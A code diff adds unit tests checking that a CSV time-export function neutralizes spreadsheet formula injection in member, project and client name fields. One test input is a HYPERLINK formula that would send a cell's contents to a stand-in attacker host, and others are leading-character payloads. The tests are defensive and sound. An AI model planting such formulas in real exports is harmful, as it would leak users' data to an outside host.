@@ -202,6 +202,40 @@ describe("buildTimeExportCsv", () => {
     expect(fields[7]).toBe("0.00"); // Rate
     expect(fields[10]).toBe("0.00"); // Amount
   });
+
+  // MS-04 — the three free-text columns are written by people, and `member_name`
+  // is written by the person the export is auditing. A leading =, +, -, @ or tab
+  // makes Excel and Sheets evaluate the cell.
+  it("neutralizes a formula in a self-set member name", () => {
+    const csv = buildTimeExportCsv([
+      row({ member_name: '=HYPERLINK("https://evil.test?d="&A1,"Total")' }),
+    ]);
+    const [, dataLine] = csv.trimEnd().split("\r\n");
+    expect(dataLine.startsWith(`"'=HYPERLINK(`)).toBe(true);
+  });
+
+  it("neutralizes the other four leading characters in project and client", () => {
+    for (const hostile of ["+1+1", "-1+1", "@SUM(A1)", "\tcmd"]) {
+      const csv = buildTimeExportCsv([
+        row({ project_name: hostile, client_name: hostile }),
+      ]);
+      const [, dataLine] = csv.trimEnd().split("\r\n");
+      const fields = dataLine.split('","').map((f) => f.replace(/^"|"$/g, ""));
+      expect(fields[2]).toBe(`'${hostile}`); // Project
+      expect(fields[3]).toBe(`'${hostile}`); // Client
+    }
+  });
+
+  // The guard must not turn a bookkeeper's money cell into text.
+  it("leaves a plain signed number unguarded", () => {
+    const csv = buildTimeExportCsv([
+      row({ resolved_rate_cents: -14_500, amount_cents: -21_750 }),
+    ]);
+    const [, dataLine] = csv.trimEnd().split("\r\n");
+    const fields = dataLine.split(",").map((f) => f.replace(/^"|"$/g, ""));
+    expect(fields[7]).toBe("-145.00"); // Rate
+    expect(fields[10]).toBe("-217.50"); // Amount
+  });
 });
 
 describe("timeExportFilename", () => {
